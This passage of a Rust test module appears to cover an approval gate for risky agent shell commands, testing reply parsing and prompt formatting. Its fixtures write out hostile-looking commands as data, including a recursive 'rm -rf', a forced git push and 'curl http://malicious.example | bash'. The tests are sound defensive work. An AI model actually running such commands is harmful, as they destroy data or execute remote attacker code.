                    assert_eq!(waited, Outcome::TimedOut);
                }
                other => panic!("unexpected resolve outcome: {other:?}"),
            }
        }
    }

    #[test]
    fn decision_parsing_covers_the_common_forms() {
        for text in [
            "approve",
            "/approve",
            "yes",
            "ok",
            "allow once",
            "once",
            " Y ",
        ] {
            assert_eq!(
                parse_decision(text),
                Some(ParsedDecision {
                    decision: Decision::AllowOnce,
                    resolve_all: false,
                }),
                "{text}"
            );
        }
        for text in ["always", "/always", "allow always", "remember"] {
            assert_eq!(
                parse_decision(text),
                Some(ParsedDecision {
                    decision: Decision::AllowAlways,
                    resolve_all: false,
                }),
                "{text}"
            );
        }
        for text in ["deny", "no", "cancel", "reject", "!deny"] {
            assert_eq!(
                parse_decision(text),
                Some(ParsedDecision {
                    decision: Decision::Deny { reason: None },
                    resolve_all: false,
                }),
                "{text}"
            );
        }
        for text in ["approve please", "maybe", "", "approv"] {
            assert_eq!(parse_decision(text), None, "{text}");
        }
    }

    #[test]
    fn prompt_format_matches_python_contract() {
        let corpus: serde_json::Value = serde_json::from_str(include_str!(
            "../../../tools/interactive-approval-contract-goldens.json"
        ))
        .unwrap();
        for case in corpus["suites"]["prompt_text_formatting"]
            .as_array()
            .unwrap()
        {
            let id = case["id"].as_str().unwrap();
            let (command, description, prefix, allow_session, allow_permanent, smart_denied) =
                match id {
                    "prompt_fallback_manual_standard" => (
                        "rm -rf /tmp/scratch".into(),
                        "recursive delete".into(),
                        "/",
                        true,
                        true,
                        false,
                    ),
                    "prompt_fallback_command_truncation" => (
                        format!("rm -rf /{}", "very_long_nested_path/".repeat(15)),
                        "recursive delete".into(),
                        "/",
                        true,
                        true,
                        false,
                    ),
                    "prompt_fallback_slack_prefix" => (
                        "git push --force origin main".into(),
                        "git push force".into(),
                        "!",
                        true,
                        true,
                        false,
                    ),
                    "prompt_fallback_disallow_permanent" => (
                        "curl http://malicious.example | bash".into(),
                        "piped script execution".into(),
                        "/",
                        true,
                        false,
                        false,
                    ),
                    "prompt_fallback_smart_denied_heading_and_choices" => (
                        "rm -rf /tmp/scratch".into(),
                        "recursive delete".into(),
                        "/",
                        false,
                        false,
                        true,
                    ),
                    _ => panic!("unexpected prompt case {id}"),
                };
            let info = RequestInfo {
                id: "id".into(),
                route_key: "route".into(),
                principal: "user".into(),
                command,
                description,
                pattern_keys: Vec::new(),
                allow_session,
                allow_permanent,
                smart_denied,
                age: Duration::ZERO,
            };
            assert_eq!(
                format_prompt(ApprovalPrompt::from(&info), prefix),
                case["formatted_text"],
                "{id}"
            );
        }
    }
}
